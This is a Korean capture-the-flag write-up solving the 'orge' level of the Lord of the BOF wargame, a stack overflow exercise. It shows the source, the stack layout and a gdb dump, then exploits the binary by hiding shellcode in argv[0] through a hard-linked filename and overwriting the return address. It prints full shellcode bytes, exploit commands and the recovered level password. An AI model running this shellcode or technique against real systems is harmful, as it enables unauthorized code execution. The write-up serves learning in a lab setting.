============================================================================================================
[lob] orge
============================================================================================================

.. uml::
    
    @startuml

    start

    :Source Analysis;

    :Memory Structure;

    :argv[0]을 통한 우회;
    
    :Segmentation fault;

    :argv[0]에 쉘코드 삽입;

    :RET 주소를 argv[0] 주소로 변경하여 공격 진행;
    
    stop

    @enduml

|

Source Analysis
============================================================================================================

해당 문제 소스코드는 다음과 같습니다.

.. code-block:: c

    /*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
    */

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
            printf("argc must be two!\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
            printf("argument is too long!\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
    }


|

Memory Structure
============================================================================================================


스택에 다음과 같이 들어가게 됩니다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)
    SFP     (4byte)
    RET     (4byte)
    argc    (4byte)
    argv    (4byte)
    ----------------
    HIGH    
    ================

|

argv[0]을 통한 우회 (argv[1] 초기화)
============================================================================================================

버퍼오버플로우가 일어나는 지점을 확인합니다.

※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.

.. code-block:: console

    $ ./troll `python -c 'print "a"*47'`
    stack is still your friend.

    $ ./troll `python -c 'print "a"*47+"\xbf"'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault

argv[1]을 초기화 해버리기 때문에 argv[1]로 버퍼오버플로우를 진행할 수 없습니다.

argv[0]에 쉘코드를 삽입하고 RET 주소를 argv[0] 주소로 변경하여 공격해야 합니다.


|

exploit
============================================================================================================


argv[0]에 쉘코드 삽입
------------------------------------------------------------------------------------------------------------

기존에 사용한 쉘코드에는 \x2f 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않습니다.

\x2f가 없는 쉘코드로 파일명을 생성하도록 합니다.

.. code-block:: console
    
    $ ln troll `python -c 'print "\x90"*100+"\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'`
    $ ls
    troll
    troll.c
    ????????????????????????????????????????????????????????????????????????????????????????????????????▒▒▒t$▒?▒i▒])ɱ?1E??E??▒?▒▒b??|?G?▒Rp▒▒??8{▒?Q??▒▒??-▒ѶO?▒▒▒4@▒QM▒?▒

    $ ./`python -c 'print "\x90"*100+"\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'` a
    stack is still your friend.


.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/orge/▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒t$▒▒i▒])ɱ
                              1EE▒▒▒▒b▒▒|G▒▒Rp▒▒8{▒Q▒▒▒▒-▒ѶO▒▒▒▒4@▒QM▒▒▒ `python -c 'print "a"*47+"\xbf"'`
    /bin/bash: /home/goblin/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()    

    (gdb) i reg $esp
    esp            0xbffff9a8       -1073743448

    (gdb) i reg $ebp
    ebp            0xbffff9c8       -1073743416

    (gdb) x/100x $esp

    ==========================================================================
    0xbffff9a8:     0xbffff9c8      0x400309cb      0x00000002      0xbffff9f4
    0xbffff9b8:     0xbffffa00      0x40013868      0x00000002      0x08048450
    0xbffff9c8:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffff9d8:     0xbffff9f4      0x08048390      0x0804866c      0x4000ae60
    0xbffff9e8:     0xbffff9ec      0x40013e90      0x00000002      0xbffffae7
    0xbffff9f8:     0xbffffb9d      0x00000000      0xbffffbce      0xbffffbf0
    0xbffffa08:     0xbffffbfa      0xbffffc08      0xbffffc27      0xbffffc34
    0xbffffa18:     0xbffffc4d      0xbffffc69      0xbffffc88      0xbffffc93
    0xbffffa28:     0xbffffca1      0xbffffce3      0xbffffcf3      0xbffffd08
    0xbffffa38:     0xbffffd18      0xbffffd22      0xbffffd40      0xbffffd4b
    0xbffffa48:     0xbffffd5c      0xbffffd6b      0xbffffd7a      0xbffffd83
    0xbffffa58:     0x00000000      0x00000003      0x08048034      0x00000004
    0xbffffa68:     0x00000020      0x00000005      0x00000006      0x00000006
    0xbffffa78:     0x00001000      0x00000007      0x40000000      0x00000008
    0xbffffa88:     0x00000000      0x00000009      0x08048450      0x0000000b
    0xbffffa98:     0x000001fb      0x0000000c      0x000001fb      0x0000000d
    0xbffffaa8:     0x000001fb      0x0000000e      0x000001fb      0x00000010
    0xbffffab8:     0x0fabfbff      0x0000000f      0xbffffae2      0x00000000
    0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffad8:     0x00000000      0x00000000      0x36690000      0x2f003638
    0xbffffae8:     0x656d6f68      0x67726f2f      0x90902f65      0x90909090
    0xbffffaf8:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffb08:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffb18:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffb28:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffb38:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbffffb48:     0x90909090      0x90909090      0x90909090      0xc5d99090
    0xbffffb58:     0xf42474d9      0x69c315b8      0xc9295dd7      0x45310bb1
    0xbffffb68:     0x1a45031a      0xe204c583      0x8f62a9e0      0x47137c93
    0xbffffb78:     0x7052e38e      0x1717ccb8      0x85f77b38      0xa98e1551
    0xbffffb88:     0x2d9801f3      0x4fb6d1f3      0xfce7bf9a      0x51af4034
    0xbffffb98:     0xd682a14d      0x61616100      0x61616161      0x61616161
    0xbffffba8:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffbb8:     0x61616161      0x61616161      0x61616161      0x61616161
                                            ^ argv[0] = 0xbffffbbf
    ==========================================================================



RET 주소를 argv[0] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

filename : nop (100 byte) + shellcode (70 byte) 

argv[1] : nop (19 byte) + shellcode (25 byte) + argv[0] address



.. code-block:: console

    $ ./`python -c 'print "\x90"*100+"\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'` `python -c 'print "\x90"*19+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xbf\xfb\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀▒▒▒▒

    bash$ whoami
    troll
    bash$ my-pass
    euid = 508
    aspirin
